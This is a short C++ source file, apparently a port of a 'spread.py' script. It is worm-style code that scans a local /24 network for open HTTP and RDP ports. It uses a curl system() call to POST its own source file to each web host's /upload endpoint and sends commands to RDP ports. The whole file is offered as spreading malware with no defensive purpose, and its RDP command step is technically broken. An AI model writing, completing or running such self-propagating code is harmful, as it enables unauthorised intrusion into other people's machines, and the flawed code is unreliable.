//Make the spread.py file on c++

#include <iostream>
#include <vector>
#include <string>
#include <cstdlib>
#include <boost/asio.hpp>
#include <boost/process.hpp>

using namespace std;
using namespace boost::asio;
using namespace boost::process;

vector<string> scan_network_for_http(const string& network_prefix) {
    vector<string> open_http_hosts;
    for (int i = 1; i < 255; ++i) {
        string ip = network_prefix + "." + to_string(i);
        ip::tcp::iostream stream(ip, "80");
        if (stream) {
            open_http_hosts.push_back(ip);
        }
    }
    return open_http_hosts;
}

void upload_script_to_http(const string& host, const string& script_path) {
    string command = "curl -X POST --data-binary @" + script_path + " http://" + host + "/upload";
    system(command.c_str());
}

vector<string> scan_network_for_rdp(const string& network_prefix) {
    vector<string> open_rdp_hosts;
    for (int i = 1; i < 255; ++i) {
        string ip = network_prefix + "." + to_string(i);
        try {
            ip::tcp::iostream stream(ip, "3389");
            if (stream) {
                open_rdp_hosts.push_back(ip);
            }
        } catch (...) {
            // Ignore exceptions
        }
    }
    return open_rdp_hosts;
}

void execute_command_on_rdp(const string& host, const string& command) {
    try {
        ip::tcp::iostream stream(host, "3389");
        if (stream) {
            stream << command << endl;
            string response;
            while (getline(stream, response)) {
                cout << response << endl;
            }
        }
    } catch (const std::exception& e) {
        cerr << "Error executing command on " << host << ": " << e.what() << endl;
    }
}

int main() {
    string network_prefix = "192.168.1";

    // Scan for HTTP hosts and upload script
    vector<string> open_http_hosts = scan_network_for_http(network_prefix);
    for (const auto& host : open_http_hosts) {
        upload_script_to_http(host, "spread.cpp");
    }

    // Scan for RDP hosts and execute command
    vector<string> open_rdp_hosts = scan_network_for_rdp(network_prefix);
    for (const auto& host : open_rdp_hosts) {
        execute_command_on_rdp(host, "echo 'Hello from RDP'");
    }

    return 0;
}